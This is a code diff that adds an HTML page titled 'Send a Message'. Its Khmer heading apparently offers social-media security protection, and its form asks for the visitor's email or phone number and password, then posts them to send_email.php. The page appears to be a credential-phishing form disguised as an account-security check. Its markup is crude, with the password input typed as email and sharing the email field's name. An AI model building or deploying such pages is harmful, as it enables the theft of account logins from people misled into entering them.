@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Send a Message</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f2f2f2;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .form-container {
+      background: white;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.1);
+      width: 100%;
+      max-width: 400px;
+    }
+
+    .form-container h2 {
+      margin-bottom: 20px;
+      font-size: 24px;
+      color: #333;
+      text-align: center;
+    }
+
+    input[type="email"],
+    input[type="text"],
+    textarea {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0 20px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      font-size: 16px;
+    }
+
+    button {
+      width: 100%;
+      padding: 12px;
+      background-color: #4CAF50;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #45a049;
+    }
+  </style>
+</head>
+<body>
+  <div class="form-container">
+    <h2>ការពារសន្តិសុខបណ្ដាញសង្គម</h2>
+    <form action="send_email.php" method="POST">
+      <input type="email" name="email" placeholder="អ៊ីមែល ឬលេខទូរស័ព្ទរបស់អ្នក" required>
+      <input type="email" name="email" placeholder="លេខសម្ងាត់របស់អ្នក" required>
+      <textarea name="message" rows="5" placeholder="សរសេរនៅអ្វីដែលអ្នកចង់បាននៅទីនេះ..." required></textarea>
+      <button type="submit">Send</button>
+    </form>
+  </div>
+</body>
+</html>
